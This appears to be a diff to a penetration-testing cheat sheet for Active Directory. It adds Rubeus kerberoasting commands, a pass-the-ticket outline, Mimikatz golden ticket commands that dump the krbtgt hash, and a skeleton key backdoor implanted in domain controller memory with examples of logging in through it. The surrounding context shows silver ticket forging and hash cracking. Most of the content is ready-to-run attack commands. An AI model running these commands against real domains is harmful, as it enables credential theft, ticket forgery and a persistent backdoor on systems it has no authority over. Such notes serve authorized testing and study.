@@ -271,7 +271,10 @@ PSexec can also be yused from windows client
 
 ## Kerberoasting
 
-* If local access is give then use Rubeus: `Rubeus.exe herberoast /stats`
+* If local access is give then use Rubeus: 
+
+Check first: `Rubeus.exe kerberoast /stats`
+Roast: `Rubeus.exe kerberoast`
 
 
 * Look for kerberoastable accounts:
@@ -300,6 +303,13 @@ Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domai
 `hashcat -a 0 -m 13100 --force SPN.hash /wordlists/rockyou.txt`
 
 ## Pass the Ticket
+
+Short annotation of how it works follows:
+
+* dump TGT from LSASS
+* use TGT toact as domain admin by injecting it into current login sessions ID
+* access services that can be accessed by the admin owner of the ticket
+
 
 1. Perform triage with Rubeus: `.\Rubeus.exe triage`
 2. see which tickets provide access to tgt
@@ -331,6 +341,31 @@ compromised password -> https://www.browserling.com/tools/ntlm-hash
 4. Forge ticket using rubeus:
 `Rubeus.exe silver /service:SQL/someDC:6565/SQL /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)
 
+## Golden Ticket
+
+### Mimikatz Golden Ticket
+
+1. Dump SID and hash and inject it into memmory
+
+`lsadump::lsa /inject /name:krbtgt`
+
+2. Create golden Ticket
+
+`Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`
+
+## Sekeleton key
+
+It backdoors AD with a key implanted in DC memmory: mimikatz
+
+`misc::skeleton`
+
+for example access share using skeleton key
+
+`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
+
+Access anything without knowing the user
+
+`dir \\Desktop-1\c$ /user:Machine1 mimikatz`
 
 
 ## Hash cracking
